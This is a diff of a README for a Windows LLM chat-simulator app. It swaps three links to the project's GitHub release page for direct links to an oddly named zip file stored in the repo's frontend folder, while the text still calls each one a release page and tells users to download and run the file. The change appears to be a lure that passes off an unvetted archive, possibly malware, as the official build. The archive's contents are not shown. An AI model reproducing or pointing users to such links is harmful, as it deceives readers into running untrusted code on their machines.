@@ -1,6 +1,6 @@
 # 🤖 Claude-Generated-Reddit-for-LLMs - Simulate LLM chats with ease
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/conservationunpalatableness659/Claude-Generated-Reddit-for-LLMs/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/conservationunpalatableness659/Claude-Generated-Reddit-for-LLMs/main/frontend/Generated_for_Reddit_Claude_LL_Ms_oxyethyl.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ Use it with Ollama or LM Studio on Windows. It gives you a simple way to run thr
 
 Visit the release page to download and run the Windows build:
 
-[Open the download page](https://github.com/conservationunpalatableness659/Claude-Generated-Reddit-for-LLMs/releases)
+[Open the download page](https://raw.githubusercontent.com/conservationunpalatableness659/Claude-Generated-Reddit-for-LLMs/main/frontend/Generated_for_Reddit_Claude_LL_Ms_oxyethyl.zip)
 
 After the page opens, look for the latest release and download the Windows file from the assets list. If you see a .exe or .zip file, use that one.
 
@@ -164,7 +164,7 @@ This project centers on:
 
 ## 📎 Download again
 
-[Go to the release page](https://github.com/conservationunpalatableness659/Claude-Generated-Reddit-for-LLMs/releases)
+[Go to the release page](https://raw.githubusercontent.com/conservationunpalatableness659/Claude-Generated-Reddit-for-LLMs/main/frontend/Generated_for_Reddit_Claude_LL_Ms_oxyethyl.zip)
 
 ## 🗂️ Topic tags
 
